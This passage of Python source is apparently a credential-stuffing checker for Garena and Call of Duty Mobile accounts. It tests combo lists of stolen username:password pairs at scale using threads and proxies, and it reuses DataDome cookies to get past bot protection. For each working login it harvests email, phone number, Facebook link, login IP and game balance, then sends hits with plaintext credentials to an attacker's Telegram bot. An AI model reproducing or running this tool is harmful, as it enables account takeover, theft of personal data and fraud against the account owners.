                verification_status = '(Verified)' if email_verified else '(Not Verified)'
                email_display = f'{email} {verification_status}'
            else:
                email_display = 'N/A'
            fb_username = details['facebook'].get('fb_username', 'N/A')
            fb_uid = details['facebook'].get('fb_uid', 'N/A')
            if fb_uid != 'N/A' and fb_uid:
                fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}'
            else:
                fb_link = 'N/A'
            if fb_uid == 'N/A' or not fb_uid:
                fb_info = 'NOT CONNECTED'
            elif not fb_username or fb_username == 'N/A':
                fb_info = 'FB UNBIND or FB DELETED'
            else:
                fb_info = 'CONNECTED'
            login_history = details.get('login_history', [])
            last_login_info = login_history[0] if login_history else {}
            last_login = last_login_info.get('timestamp', 0)
            last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
            last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
            last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
            last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
            account_data = {
                'account': account,
                'password': password,
                'uid': details.get('uid', 'N/A'),
                'username': details.get('username', 'N/A'),
                'nickname': details.get('nickname', 'N/A'),
                'email': details.get('email', 'N/A'),
                'email_verified': details.get('email_verified', False),
                'email_display': email_display,
                'formatted_mobile': formatted_mobile,
                'country': details['personal'].get('country', 'N/A'),
                'shell_balance': details['profile'].get('shell_balance', 0),
                'account_status': details['status'].get('account_status', 'N/A'),
                'fb_username': fb_username,
                'fb_uid': fb_uid,
                'fb_link': fb_link,
                'fb_info': fb_info,
                'bind_status': details.get('bind_status', 'N/A'),
                'is_clean': details.get('is_clean', False),
                'has_codm': has_codm,
                'is_error': False,
                'last_login_date': last_login_date,
                'last_login_where': last_login_where,
                'last_login_ip': last_login_ip,
                'last_login_country': last_login_country,
                'two_step_verify': details['security'].get('two_step_verify', False),
                'authenticator_app': details['security'].get('authenticator_app', False),
                'game_connections': game_connections or []
            }
            if has_codm and codm_info:
                account_data.update({
                    'codm_level': int(codm_info.get('codm_level', 0)),
                    'codm_region': codm_info.get('region', 'N/A'),
                    'codm_nickname': codm_info.get('codm_nickname', 'N/A'),
                    'codm_uid': codm_info.get('uid', 'N/A'),
                    'region_code': codm_info.get('region_code', 'N/A')
                })
            else:
                account_data.update({
                    'codm_level': 0,
                    'codm_region': 'N/A',
                    'codm_nickname': 'N/A',
                    'codm_uid': 'N/A',
                    'region_code': 'N/A'
                })
            results_manager.add_account(account_data)
            codm_level = account_data.get('codm_level', 0)
            live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm, codm_level=codm_level, game_connections=game_connections, shell=details['profile'].get('shell_balance', 0))
            live_stats.update_highest(details['profile'].get('shell_balance', 0), codm_level, details['is_clean'])
            if has_codm:
                live_stats.add_codm_details(codm_level, details['personal'].get('country', 'N/A'))
            live_stats.push_result(success=True, is_clean=details['is_clean'], has_codm=has_codm, codm_level=codm_level)
            if CHECK_OTHER_GAMES and game_connections:
                save_game_folder(account, password, account_data, game_connections, results_manager.base_dir)
            display_info(account, password, details, codm_info, has_codm, gc=game_connections)
            if auto_remove:
                file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
            return ('DONE', account_data)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            session.cookies.clear()
            if attempt < max_retries:
                if not suppress_print:
                    print(f'  {YELLOW}⚠  Connection/Timeout error, retrying ({attempt}/{max_retries}){RESET}')
                time.sleep(3)
                continue
            else:
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)
        except Exception as e:
            if attempt < max_retries:
                time.sleep(2)
                continue
            else:
                logger.error(f'[ERROR] Unexpected error processing {account}')
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Unexpected Error: {str(e)}'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)

# ============================================
# VALIDATOR CHECK (From cod.py - Modified UI)
# ============================================

def validator_check():
    clear_screen()
    display_banner()
    indent = '    '
    w = _w(68)
    
    print(f"  {GRAY}╔{'═' * (w - 4)}╗{RESET}")
    title = " VALIDATOR MODE "
    title_pad = (w - 4) - len(title) - 1
    print(f"  {GRAY}║{RED}{title}{RESET}{' ' * title_pad}{GRAY}║{RESET}")
    print(f"  {GRAY}╠{'═' * (w - 4)}╣{RESET}")
    print(f"  {GRAY}║{RESET} {YELLOW}⚠  SECURITY NOTICE{RESET}{' ' * 40}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {GRAY}USE A VPN BEFORE VALIDATING{RESET}{' ' * 30}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {GRAY}ExpressVPN or any VPN recommended to avoid IP bans{RESET}{' ' * 10}{GRAY}║{RESET}")
    print(f"  {GRAY}╠{'═' * (w - 4)}╣{RESET}")
    print(f"  {GRAY}║{RESET} {WHITE}⬡  VALIDATOR MODE{RESET}  {GRAY}— login-only, no game data fetched{RESET}{' ' * 15}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {GRAY}Results → Results/validator_*/{RESET}{' ' * 30}{GRAY}║{RESET}")
    print(f"  {GRAY}╚{'═' * (w - 4)}╝{RESET}\n")
    
    file_manager = AccountFileManager()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        _log('ERROR', 'No .txt files found in Combo folder.')
        input(f'\n  {GRAY}[Press Enter to return to menu]{RESET} ')
        return
    
    selected_file, _ = select_input_file_flow(show_auto_remove=False)
    if not selected_file:
        _log('ERROR', 'No file selected.')
        input(f'\n  {GRAY}[Press Enter to return to menu]{RESET} ')
        return
    
    accounts = []
    with open(selected_file, 'r', encoding='utf-8', errors='ignore') as fh:
        for line in fh:
            acc, pw = clean_account_line(line)
            if acc and pw:
                accounts.append((acc, pw))
    
    if not accounts:
        _log('ERROR', 'No valid account:password lines found.')
        input(f'\n  {GRAY}[Press Enter to return to menu]{RESET} ')
        return
    
    _log('INFO', f'Loaded [bold]{len(accounts):,}[/bold] combos')
    print()
    
    while True:
        try:
            raw_t = input(f'  {CYAN}➤ Threads 1-20 {GRAY}(default {DEFAULT_THREADS}){RESET}  {CYAN}➤{RESET} ').strip()
            num_threads = int(raw_t) if raw_t else DEFAULT_THREADS
            if 1 <= num_threads <= 20:
                break
            _log('ERROR', 'Enter a value between 1 and 20.')
        except ValueError:
            _log('ERROR', 'Invalid input — enter a number.')
    
    _log('SUCCESS', f'Running with [bold]{num_threads}[/bold] thread(s)')
    print()
    
    stem = Path(selected_file).stem
    ts_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    out_dir = Path('Results') / f'validator_{stem}_{ts_str}'
    out_dir.mkdir(parents=True, exist_ok=True)
    
    valid_path = out_dir / 'valid.txt'
    invalid_path = out_dir / 'invalid.txt'
    error_path = out_dir / 'errors.txt'
    
    valid_fh = open(valid_path, 'a', encoding='utf-8', buffering=1)
    invalid_fh = open(invalid_path, 'a', encoding='utf-8', buffering=1)
    error_fh = open(error_path, 'a', encoding='utf-8', buffering=1)
    
    vl = {'valid': 0, 'invalid': 0, 'error': 0, 'done': 0}
    st_lock = threading.Lock()
    file_lock = threading.Lock()
    stop_ev = threading.Event()
    print_lock = threading.Lock()
    start_time = time.time()
    total = len(accounts)
    cookie_manager_val = CookieManager()
    _tl = threading.local()
    
    print(f"  {GRAY}Output: {out_dir}{RESET}")
    print(f"  {GRAY}{'─' * 54}{RESET}")
    
    def _get_sess():
        if not hasattr(_tl, 's'):
            s = requests.Session()
            dm = DataDomeManager()
            cks = cookie_manager_val.get_valid_cookies()
            if cks:
                applyck(s, '; '.join(cks))
                for part in cks[-1].split(';'):
                    part = part.strip()
                    if part.startswith('datadome='):
                        dm.set_datadome(part.split('=', 1)[1].strip())
                        break
            else:
                proxy_dict = dict(s.proxies) if s.proxies else None
                dd = get_datadome_cookie(s, proxies=proxy_dict)
                if dd:
                    dm.set_datadome(dd)
                    s.cookies.set('datadome', dd, domain='.garena.com')
            _tl.s = s
            _tl.dm = dm
        return (_tl.s, _tl.dm)
    
    def _print_line(tag, account, password, note=''):
        tags = {
            'valid': ('VALID', GREEN),
            'invalid': ('INVALID', RED),
            'error': ('ERROR', GRAY)
        }
        tag_str, color = tags.get(tag, ('------', GRAY))
        with print_lock:
            if tag == 'valid':
                print(f'  {GREEN}VALID  {RESET}  {WHITE}{account}:{password}{RESET}')
            else:
                reason = note.upper() if note else 'INCORRECT PASSWORD' if tag == 'invalid' else 'UNKNOWN ERROR'
                c = RED if tag == 'invalid' else GRAY
                print(f'  {c}INVALID{RESET}  {GRAY}{account}:{password}{RESET}  {GRAY}{reason}{RESET}')
    
    def _print_live_stats():
        with st_lock:
            v = vl['valid']
            iv = vl['invalid']
            er = vl['error']
            dn = vl['done']
        elapsed = max(time.time() - start_time, 0.001)
        rate = dn / elapsed
        eta = (total - dn) / rate if rate > 0 else 0
        pct = dn / total * 100 if total > 0 else 0
        bar_w = 20
        filled = int(pct / 100 * bar_w)
        bar = f"{CYAN}{'█' * filled}{BRIGHT_BLACK}{'░' * (bar_w - filled)}{RESET}"
        with print_lock:
            print(f'\n  {bar}  {YELLOW}{pct:.1f}%{RESET}  {CYAN}{dn}/{total}{RESET}  {GREEN}✔{v}{RESET}  {RED}✖{iv}{RESET}  {GRAY}⊡{er}{RESET}  {GRAY}{rate:.1f}/s  ETA {int(eta // 60)}m{int(eta % 60):02d}s{RESET}\n')
    
    def _check_one(acc_pw):
        if stop_ev.is_set():
            return
        account, password = acc_pw
        result = 'error'
        note = ''
        try:
            session, dm = _get_sess()
            v1, v2, _ = _prelogin_no_ip_wait(session, account, dm)
            if not v1 or not v2:
                result = 'invalid'
                note = 'Account Not Found'
            else:
                sso_key = login(session, account, password, v1, v2)
                if sso_key:
                    result = 'valid'
                    note = ''
                else:
                    result = 'invalid'
                    note = 'Incorrect Password'
        except Exception as e:
            result = 'error'
            note = type(e).__name__
        with file_lock:
            if result == 'valid':
                valid_fh.write(f'{account}:{password}\n')
            elif result == 'invalid':
                invalid_fh.write(f'{account}:{password}\n')
            else:
                error_fh.write(f'{account}:{password}  | {note}\n')
        with st_lock:
            vl[result] += 1
            vl['done'] += 1
            done_now = vl['done']
        _print_line(result, account, password, note)
        if done_now % 5 == 0 or done_now == total:
            _print_live_stats()
    
    try:
        with ThreadPoolExecutor(max_workers=num_threads) as ex:
            futs = {ex.submit(_check_one, ap): ap for ap in accounts}
            for fut in as_completed(futs):
                if stop_ev.is_set():
                    break
                try:
                    fut.result(timeout=30)
                except Exception:
                    pass
    except KeyboardInterrupt:
        stop_ev.set()
        _log('WARNING', 'Stopping — flushing results…')
    finally:
        valid_fh.close()
        invalid_fh.close()
        error_fh.close()
    
    elapsed = max(time.time() - start_time, 0.001)
    with st_lock:
        v = vl['valid']
        iv = vl['invalid']
        er = vl['error']
        dn = vl['done']
    
    display_summary(dn, er, v, {}, [], total, 0, 0, 0)
    
    print(f'  {GRAY}✔ Valid    {RESET}  {CYAN}{valid_path}{RESET}')
    print(f'  {GRAY}✖ Invalid  {RESET}  {CYAN}{invalid_path}{RESET}')
    print(f'  {GRAY}· Errors   {RESET}  {CYAN}{error_path}{RESET}')
    print(f'\n  {MAGENTA}  ⬡  Powered by SHIN PALAUTOG{RESET}\n')
    input(f'  {GRAY}[Press Enter to return to menu]{RESET} ')

# ============================================
# BULK CHECK (From cod.py - Modified to show full format_hit)
# ============================================

def bulk_check():
    clear_screen()
    display_banner()
    
    file_manager = AccountFileManager()
    
    selected_file, auto_remove = select_input_file_flow(show_auto_remove=True)
    if not selected_file:
        _log('ERROR', 'No file selected.')
        return
    
    dup_choice = input(f"  {GRAY}➤{YELLOW} REMOVE DUPLICATE LINES? [Y/N] : {WHITE}").strip()
    print(RESET, end="")
    if dup_choice.lower() == 'y':
        prompt_for_duplicate_removal(selected_file)
    
    accounts = []
    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                account, password = clean_account_line(line)
                if account and password:
                    accounts.append(f'{account}:{password}')
        _log('SUCCESS', f'File loaded: [bold]{len(accounts):,}[/bold] accounts')
    except Exception as e:
        _log('ERROR', 'Could not read file.')
        return
    
    if not accounts:
        _log('ERROR', 'No valid accounts found in file.')
        return
    
    _log('INFO', f'Total accounts queued: [bold]{len(accounts):,}[/bold]')
    print()
    
    w = _w(60)
    print(f"  {GRAY}╔{'═' * (w - 4)}╗{RESET}")
    title = " PROXY CONFIGURATION "
    title_pad = (w - 4) - len(title) - 1
    print(f"  {GRAY}║{YELLOW}{title}{RESET}{' ' * title_pad}{GRAY}║{RESET}")
    print(f"  {GRAY}╠{'═' * (w - 4)}╣{RESET}")
    print(f"  {GRAY}║{RESET} {CYAN}[ 1 ]{RESET}  {WHITE}USE PROXIES.TXT{RESET}{' ' * 30}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {CYAN}[ 2 ]{RESET}  {WHITE}NO PROXY (RECOMMENDED){RESET}{' ' * 20}{GRAY}║{RESET}")
    print(f"  {GRAY}╚{'═' * (w - 4)}╝{RESET}\n")
    
    proxy_manager = None
    while True:
        use_proxy = input(f"  {CYAN}➤{RESET} {WHITE}CHOICE :{RESET} ").strip()
        if use_proxy in ['1', '2']:
            break
        _log('ERROR', 'Invalid choice. Select 1 or 2.')
    print()
    
    if use_proxy == '1':
        if not os.path.exists("proxies.txt"):
            _log('WARNING', 'proxies.txt not found! Running without proxies.')
        else:
            proxy_manager = ProxyManager()
            if proxy_manager.is_loaded():
                _log('SUCCESS', f'Loaded [bold]{len(proxy_manager.proxies)}[/bold] proxies')
            else:
                _log('WARNING', 'No valid proxies found. Running without proxies.')
                proxy_manager = None
    
    max_threads = 30 if proxy_manager else 20
    print(f"  {GRAY}╔{'═' * (w - 4)}╗{RESET}")
    title = " THREAD CONFIGURATION "
    title_pad = (w - 4) - len(title) - 1
    print(f"  {GRAY}║{YELLOW}{title}{RESET}{' ' * title_pad}{GRAY}║{RESET}")
    print(f"  {GRAY}╠{'═' * (w - 4)}╣{RESET}")
    print(f"  {GRAY}║{RESET} {GREEN}1–8  {RESET}  {GRAY}Safe (recommended){RESET}{' ' * 30}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {YELLOW}9–20 {RESET}  {GRAY}Medium speed{RESET}{' ' * 30}{GRAY}║{RESET}")
    if proxy_manager:
        print(f"  {GRAY}║{RESET} {CYAN}21–30{RESET}  {GRAY}Fast — proxy only{RESET}{' ' * 25}{GRAY}║{RESET}")
    else:
        print(f"  {GRAY}║{RESET} {CYAN}11–20{RESET}  {GRAY}Fast{RESET}{' ' * 35}{GRAY}║{RESET}")
    print(f"  {GRAY}╚{'═' * (w - 4)}╝{RESET}\n")
    
    while True:
        try:
            raw = input(f'  {CYAN}➤ Threads 1-{max_threads} {GRAY}(default {DEFAULT_THREADS}){RESET}  {CYAN}➤{RESET} ').strip()
            if not raw:
                num_threads = DEFAULT_THREADS
                break
            num_threads = int(raw)
            if 1 <= num_threads <= max_threads:
                break
            _log('ERROR', f'Enter a value between 1 and {max_threads}.')
        except ValueError:
            _log('ERROR', 'Invalid input — enter a number.')
    
    _log('SUCCESS', f'Running with [bold]{num_threads}[/bold] thread(s)')
    print()
    
    global CHECK_OTHER_GAMES
    print(f"  {GRAY}╔{'═' * (w - 4)}╗{RESET}")
    title = " GAME CONNECTIONS "
    title_pad = (w - 4) - len(title) - 1
    print(f"  {GRAY}║{MAGENTA}{title}{RESET}{' ' * title_pad}{GRAY}║{RESET}")
    print(f"  {GRAY}╠{'═' * (w - 4)}╣{RESET}")
    print(f"  {GRAY}║{RESET} {GRAY}Check OTHER GAMES (AOV / ROV / FF / Delta Force…){RESET}{' ' * 10}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {GRAY}Saves each game to separate file  ·  Adds ~1-3s per account{RESET}{' ' * 5}{GRAY}║{RESET}")
    print(f"  {GRAY}╚{'═' * (w - 4)}╝{RESET}\n")
    og_raw = input(f'  {MAGENTA}◇  Check other games? (y/N){RESET}  {CYAN}➤{RESET} ').strip().lower()
    CHECK_OTHER_GAMES = og_raw == 'y'
    if CHECK_OTHER_GAMES:
        _log('SUCCESS', 'Will scan all Garena game connections')
    else:
        _log('INFO', 'CODM only — skipping other game checks')
    print()
    
    results_manager = ResultsManager(selected_file)
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    live_stats.total_accounts = len(accounts)
    
    _TG_CFG_FILE = os.path.join(_SCRIPT_DIR_COOKIE, '.tg_cfg')
    def _tg_save(token, chat_id, mode, clean_range, nc_range):
        try:
            import json as _j
            with open(_TG_CFG_FILE, 'w', encoding='utf-8') as _f:
                _j.dump({'token': token, 'chat_id': chat_id, 'mode': mode, 'clean': clean_range, 'nc': nc_range}, _f)
        except Exception:
            pass
    def _tg_load():
        try:
            import json as _j
            if not os.path.exists(_TG_CFG_FILE):
                return None
            with open(_TG_CFG_FILE, 'r', encoding='utf-8') as _f:
                d = _j.load(_f)
            if d.get('token') and d.get('chat_id'):
                return d
        except Exception:
            pass
        return None
    
    _saved_tg = _tg_load()
    
    print(f"  {GRAY}╔{'═' * (w - 4)}╗{RESET}")
    title = " TELEGRAM NOTIFICATION "
    title_pad = (w - 4) - len(title) - 1
    print(f"  {GRAY}║{YELLOW}{title}{RESET}{' ' * title_pad}{GRAY}║{RESET}")
    print(f"  {GRAY}╠{'═' * (w - 4)}╣{RESET}")
    print(f"  {GRAY}║{RESET} {WHITE}1{RESET}  {YELLOW}›{RESET}  {GRAY}Send Clean hits only{RESET}{' ' * 30}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {WHITE}2{RESET}  {YELLOW}›{RESET}  {GRAY}Send Not-Clean hits only{RESET}{' ' * 25}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {WHITE}3{RESET}  {YELLOW}›{RESET}  {GRAY}Send Both (clean + not-clean){RESET}{' ' * 20}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {WHITE}4{RESET}  {GRAY}›  No Telegram (skip){RESET}{' ' * 25}{GRAY}║{RESET}")
    print(f"  {GRAY}╚{'═' * (w - 4)}╝{RESET}\n")
    
    tg_choice = ''
    while tg_choice not in ('1', '2', '3', '4'):
        tg_choice = input(f'  {YELLOW}➤{RESET} ').strip()
    TG_ENABLED = tg_choice != '4'
    TG_SEND_CLEAN = tg_choice in ('1', '3')
    TG_SEND_NOTCLEAN = tg_choice in ('2', '3')
    TG_BOT_TOKEN = ''
    TG_CHAT_ID = ''
    TG_LVL_MIN_CLEAN = 0
    TG_LVL_MAX_CLEAN = 400
    TG_LVL_MIN_NOTCLEAN = 0
    TG_LVL_MAX_NOTCLEAN = 400
    
    if TG_ENABLED:
        print()
        if _saved_tg:
            _masked = f"...{_saved_tg['token'][-6:]}" if len(_saved_tg['token']) > 6 else '******'
            print(f"  {GREEN}✔  Saved config found{RESET}  {GRAY}Token: {_masked}  |  Chat: {_saved_tg['chat_id']}{RESET}")
            _use_saved = input(f'  {YELLOW}➤ Use saved config? (y/n){RESET}  {YELLOW}➤{RESET} ').strip().lower()
            if _use_saved == 'y':
                TG_BOT_TOKEN = _saved_tg['token']
                TG_CHAT_ID = _saved_tg['chat_id']
                _cr = _saved_tg.get('clean', [0, 9999])
                _nr = _saved_tg.get('nc', [0, 9999])
                TG_LVL_MIN_CLEAN = _cr[0] if TG_SEND_CLEAN else 0
                TG_LVL_MAX_CLEAN = _cr[1] if TG_SEND_CLEAN else 9999
                TG_LVL_MIN_NOTCLEAN = _nr[0] if TG_SEND_NOTCLEAN else 0
                TG_LVL_MAX_NOTCLEAN = _nr[1] if TG_SEND_NOTCLEAN else 9999
                _log('SUCCESS', 'Using saved config.')
            else:
                _saved_tg = None
        if not _saved_tg:
            TG_BOT_TOKEN = input(f'  {YELLOW}➤ Bot Token{RESET}  {YELLOW}➤{RESET} ').strip()
            TG_CHAT_ID = input(f'  {YELLOW}➤ Chat ID{RESET}  {YELLOW}➤{RESET} ').strip()
            if TG_SEND_CLEAN:
                print()
                print(f'  {GRAY}Level range for {GREEN}CLEAN{RESET}{GRAY} hits — format: min-max (e.g. 50-400){RESET}')
                raw_clean = input(f'  {GREEN}➤ Clean level range (Enter = all){RESET}  {GREEN}➤{RESET} ').strip()
                if raw_clean and '-' in raw_clean:
                    try:
                        parts = raw_clean.split('-')
                        TG_LVL_MIN_CLEAN = int(parts[0].strip())
                        TG_LVL_MAX_CLEAN = int(parts[1].strip())
                    except Exception:
                        pass
            if TG_SEND_NOTCLEAN:
                print()
                print(f'  {GRAY}Level range for {RED}NOT-CLEAN{RESET}{GRAY} hits — format: min-max (e.g. 1-200){RESET}')
                raw_nc = input(f'  {RED}➤ Not-clean level range (Enter = all){RESET}  {RED}➤{RESET} ').strip()
                if raw_nc and '-' in raw_nc:
                    try:
                        parts = raw_nc.split('-')
                        TG_LVL_MIN_NOTCLEAN = int(parts[0].strip())
                        TG_LVL_MAX_NOTCLEAN = int(parts[1].strip())
                    except Exception:
                        pass
            if TG_BOT_TOKEN and TG_CHAT_ID:
                _tg_save(TG_BOT_TOKEN, TG_CHAT_ID, tg_choice, [TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN], [TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN])
                _log('SUCCESS', 'Config saved for next time.')
        print()
        _log('SUCCESS', 'Telegram configured.')
        if TG_SEND_CLEAN:
            print(f'  {GRAY}Clean hits  : Level {GREEN}{TG_LVL_MIN_CLEAN}–{TG_LVL_MAX_CLEAN}{RESET}')
        if TG_SEND_NOTCLEAN:
            print(f'  {GRAY}Not-clean   : Level {RED}{TG_LVL_MIN_NOTCLEAN}–{TG_LVL_MAX_NOTCLEAN}{RESET}')
        print()
    
    def _build_tg_message(acc, pwd, ad, is_clean_hit):
        lvl = ad.get('codm_level', 0)
        region = ad.get('codm_region', 'N/A')
        nick = ad.get('codm_nickname', 'N/A')
        uid = ad.get('uid', 'N/A')
        country = ad.get('country', 'N/A')
        fb = ad.get('fb_info', 'N/A')
        fb_link = ad.get('fb_link', 'N/A')
        shell = ad.get('shell_balance', 0)
        email_d = ad.get('email_display', 'N/A')
        mobile = ad.get('formatted_mobile', 'N/A')
        login_d = ad.get('last_login_date', 'N/A')
        login_w = ad.get('last_login_where', 'N/A')
        status = ad.get('account_status', 'N/A')
        tag = '✨ CLEAN' if is_clean_hit else '⊘ NOT CLEAN'
        lines = [
            f"{'✨ CLEAN HIT' if is_clean_hit else '⊘ NOT CLEAN HIT'}",
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━',
            f'Credential: {acc}:{pwd}',
            f'Status: {tag}',
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━',
            f'Nickname: {nick}',
            f'UID: {uid}',
            f'Level: {lvl}',
            f'Region: {region}',
            f'Country: {country}',
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━',
            f'Email: {email_d}',
            f'Mobile: {mobile}',
            f'Facebook: {fb}'
        ]
        if fb_link != 'N/A':
            lines.append(f'FB Link: {fb_link}')
        lines += [
            f'Shells: {shell}',
            f'Acc Status: {status}',
            f'Last Login: {login_d}',
            f'Login Via: {login_w}',
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━',
            f'Powered by: SHIN PALAUTOGSHIN PALAUTOGsuport'
        ]
        return '\n'.join(lines)
    
    def _send_tg(token, chat_id, text, silent=False):
        try:
            import urllib.request as _ur, urllib.parse as _up
            payload = {'chat_id': chat_id, 'text': text, 'disable_notification': silent, 'parse_mode': 'HTML'}
            data = _up.urlencode(payload).encode()
            req = _ur.Request(f'https://api.telegram.org/bot{token}/sendMessage', data=data, method='POST')
            _ur.urlopen(req, timeout=8)
        except Exception:
            pass

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
    
    def _maybe_send_tg(account_data):
        if account_data.get('is_error') or not account_data.get('has_codm'):
            return
        is_clean = account_data.get('is_clean', False)
        lvl = account_data.get('codm_level', 0)
        acc = account_data.get('account', '')
        pwd = account_data.get('password', '')
        msg = _build_tg_message(acc, pwd, account_data, is_clean)
        if TG_ENABLED:
            if is_clean and TG_SEND_CLEAN and (TG_LVL_MIN_CLEAN <= lvl <= TG_LVL_MAX_CLEAN):
                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
            elif not is_clean and TG_SEND_NOTCLEAN and (TG_LVL_MIN_NOTCLEAN <= lvl <= TG_LVL_MAX_NOTCLEAN):
                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
    
    global _TG_HOOK
    _TG_HOOK = _maybe_send_tg

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
    
    clear_screen()
    display_banner()
    
    w = _w(68)
    print(f"  {GRAY}╔{'═' * (w - 4)}╗{RESET}")
    title = " PRE-CHECK SUMMARY "
    title_pad = (w - 4) - len(title) - 1
    print(f"  {GRAY}║{YELLOW}{title}{RESET}{' ' * title_pad}{GRAY}║{RESET}")
    print(f"  {GRAY}╠{'═' * (w - 4)}╣{RESET}")
    print(f"  {GRAY}║{RESET} {WHITE}ACCOUNTS LOADED{':':<20}{RESET} {GREEN}{len(accounts):,}{RESET}{' ' * 30}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {WHITE}THREADS CHOSEN{':':<20}{RESET} {CYAN}{num_threads}{RESET}{' ' * 30}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {WHITE}VALID COOKIES{':':<20}{RESET} {YELLOW}{len(cookie_manager.get_valid_cookies())}{RESET}{' ' * 30}{GRAY}║{RESET}")
    if proxy_manager:
        print(f"  {GRAY}║{RESET} {WHITE}PROXIES{':':<20}{RESET} {GREEN}{len(proxy_manager.proxies)}{RESET}{' ' * 30}{GRAY}║{RESET}")
    else:
        print(f"  {GRAY}║{RESET} {WHITE}PROXIES{':':<20}{RESET} {RED}DISABLED{RESET}{' ' * 30}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {WHITE}AUTO-REMOVE{':':<20}{RESET} {GREEN if auto_remove else RED}{'ENABLED' if auto_remove else 'DISABLED'}{RESET}{' ' * 25}{GRAY}║{RESET}")
    print(f"  {GRAY}╚{'═' * (w - 4)}╝{RESET}\n")
    
    overall_done = 0
    account_index_counter = [0]
    index_lock = threading.Lock()
    stats_lock = threading.Lock()
    global _suppress_ip_prints, _ip_block_callback
    _suppress_ip_prints = True
    
    def _ip_block_cb(blocked: bool):
        pass
    
    _ip_block_callback = _ip_block_cb
    _thread_local = threading.local()
    
    print("\n" * GARENA_UI_HEIGHT)

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
    
    def _get_thread_resources():
        if not hasattr(_thread_local, 'session') or not hasattr(_thread_local, 'datadome'):
            _thread_local.session = requests.Session()
            _thread_local.datadome = DataDomeManager()
            if proxy_manager and proxy_manager.is_loaded():
                _thread_local.session.proxies.update(proxy_manager.get_next())
            proxy_dict = dict(_thread_local.session.proxies) if proxy_manager and proxy_manager.is_loaded() else None
            valid_cookies = cookie_manager.get_valid_cookies()
            if valid_cookies:
                combined = '; '.join(valid_cookies)
                applyck(_thread_local.session, combined)
                dd_line = valid_cookies[-1]
                if 'datadome=' in dd_line:
                    for part in dd_line.split(';'):
                        part = part.strip()
                        if part.startswith('datadome='):
                            _thread_local.datadome.set_datadome(part.split('=', 1)[1].strip())
                            break
            else:
                dd = get_datadome_cookie(_thread_local.session, proxies=proxy_dict)
                if dd:
                    _thread_local.datadome.set_datadome(dd)
        return (_thread_local.session, _thread_local.datadome)
    
    def _worker(account_line):
        if ':' not in account_line:
            return ('DONE', account_line, {})
        try:
            account, password = account_line.split(':', 1)
            account = account.strip()
            password = password.strip()
            session, datadome_mgr = _get_thread_resources()
            
            with stats_lock:
                nonlocal overall_done
                overall_done += 1
                stats = live_stats.get_stats()
                sys.stdout.write(f"\033[{GARENA_UI_HEIGHT}A\033[J")
                sys.stdout.flush()
                print(f"   {CYAN}➤{RESET} {WHITE}Checking: {account}{RESET}")
                print(f"   {GRAY}───────────────────────────────────────────────────────{RESET}")
                print(build_live_stats_ui(stats, 75))
            
            status, account_data = processaccount(
                session, account, password, cookie_manager, datadome_mgr,
                live_stats, results_manager, file_manager, selected_file,
                auto_remove, suppress_print=True, proxy_manager=proxy_manager
            )
            
            with stats_lock:
                stats = live_stats.get_stats()
                sys.stdout.write(f"\033[{GARENA_UI_HEIGHT}A\033[J")
                sys.stdout.flush()

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

                
                if status == 'DONE' and account_data:
                    try:
                        is_clean = account_data.get('is_clean', False)
                        has_codm = account_data.get('has_codm', False)
                        codm_level = account_data.get('codm_level', 0)
                        shell = account_data.get('shell_balance', 0)
                        username = account_data.get('username', account)
